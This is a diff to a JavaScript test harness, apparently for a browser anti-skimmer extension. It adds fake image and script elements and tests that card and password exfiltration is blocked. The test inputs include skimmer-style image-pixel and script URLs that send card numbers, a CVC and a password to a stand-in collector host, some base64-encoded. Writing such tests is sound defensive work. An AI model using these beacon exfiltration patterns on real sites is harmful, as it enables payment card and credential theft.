@@ -53,7 +53,7 @@ function makeField(kind, value) {
 function makeHarness(options) {
   const opts = options || {};
   const state = {
-    fetches: [], beacons: [], xhrSends: [], websocketSends: [], formSubmits: [], emits: [],
+    fetches: [], beacons: [], xhrSends: [], websocketSends: [], formSubmits: [], emits: [], srcs: [],
   };
   const listeners = Object.create(null);
   const fields = [];
@@ -127,6 +127,23 @@ function makeHarness(options) {
     send(data) { state.websocketSends.push(data); }
   }
 
+  /* Images and scripts with the accessor shape the browser gives them: src and srcset live on the
+     prototype as configurable setters, and setAttribute lives on Element. */
+  class FakeElement {
+    setAttribute(name, value) { state.srcs.push([this.tag + ':attr:' + name, String(value)]); }
+  }
+  class FakeImage extends FakeElement { constructor() { super(); this.tag = 'img'; } }
+  class FakeScript extends FakeElement { constructor() { super(); this.tag = 'script'; } }
+  for (const [Cls, props] of [[FakeImage, ['src', 'srcset']], [FakeScript, ['src']]]) {
+    for (const prop of props) {
+      Object.defineProperty(Cls.prototype, prop, {
+        configurable: true, enumerable: true,
+        get() { return this['_' + prop] || ''; },
+        set(value) { this['_' + prop] = String(value); state.srcs.push([this.tag + ':' + prop, String(value)]); },
+      });
+    }
+  }
+
   class FakeForm {
     constructor(action, formFields) {
       this.action = action;
@@ -159,6 +176,9 @@ function makeHarness(options) {
     XMLHttpRequest: FakeXHR,
     WebSocket: FakeWebSocket,
     HTMLFormElement: FakeForm,
+    Element: FakeElement,
+    HTMLImageElement: FakeImage,
+    HTMLScriptElement: FakeScript,
     Storage: FakeStorage,
     document,
     location: {
@@ -255,6 +275,36 @@ function makeHarness(options) {
   assert.strictEqual(frame.state.xhrSends.length, 0, 'off-site password XHR never reaches native send');
   assert.deepStrictEqual(Array.from(xhr.events), ['readystatechange', 'error', 'loadend'],
     'blocked XHR receives a terminal network-error shape');
+
+  /* Pixels and script addresses: the 1v1 skimmer sent each value twice, by fetch (blocked) and as an image
+     query carrying URL-encoded base64 (not blocked). */
+  const before = frame.state.srcs.length;
+  const pixel = new frame.sandbox.HTMLImageElement();
+  pixel.src = 'https://collector.evil.test/p.gif?cc=4111111111111111';
+  pixel.src = 'https://collector.evil.test/p.gif?d=' + encodeURIComponent(Buffer.from(JSON.stringify({ name: 'Lab', cardnumber: '4111111111111111', cvc: '123' })).toString('base64'));
+  pixel.srcset = 'https://collector.evil.test/p.gif?cc=4111111111111111 1x';
+  pixel.setAttribute('src', 'https://collector.evil.test/q.gif?cc=4111%201111%201111%201111');
+  assert.strictEqual(frame.state.srcs.length, before, 'a pixel carrying the card never reaches the native setter');
+  assert.strictEqual(frame.state.emits.at(-1).type, 'blocked_skimmer_exfil');
+  assert.strictEqual(frame.state.emits.at(-1).detail.channel, 'element');
+  const script = new frame.sandbox.HTMLScriptElement();
+  script.src = 'https://collector.evil.test/c.js?pw=' + encodeURIComponent('correct horse battery staple');
+  assert.strictEqual(frame.state.srcs.length, before, 'a script address carrying the password is refused');
+  const photo = new frame.sandbox.HTMLImageElement();
+  photo.src = 'https://images.cdn.test/photo.jpg?token=abcdef0123456789abcdef0123456789';
+  photo.src = 'https://checkout.example/p.gif?cc=4111111111111111';
+  photo.setAttribute('alt', 'a photo');
+  photo.setAttribute('src', 'https://images.cdn.test/thumb.jpg');
+  assert.strictEqual(frame.state.srcs.length, before + 4, 'signed image links, same-site images and other attributes stay native');
+  console.log('  ok  - pixels and script addresses carrying a card or password are refused; ordinary images load');
+  /* The top-page skimmer guard (src/content.js) closes the same gap; its behaviour is checked in a real browser
+     (behavioral2 skimmer case: 0 sink hits), and the shipped build must carry the hooks. */
+  const pageGuard = fs.readFileSync(path.join(ROOT, 'content.min.js'), 'utf8');
+  assert(/guardSkimSrc\(HTMLImageElement\.prototype,"src","an image"\)/.test(pageGuard)
+    && /guardSkimSrc\(HTMLImageElement\.prototype,"srcset","an image"\)/.test(pageGuard)
+    && /guardSkimSrc\(HTMLScriptElement\.prototype,"src","a script"\)/.test(pageGuard)
+    && /skimUrlCarriesCard=raw=>\{[^}]*decodeURIComponent/.test(pageGuard.replace(/\s+/g, ' ')),
+  'the shipped page skimmer guard checks image and script addresses, decoded');
 
   const opaqueToken = 'shortOpaqueSecret123';
   frame.sandbox.localStorage.setItem('session_token', opaqueToken);
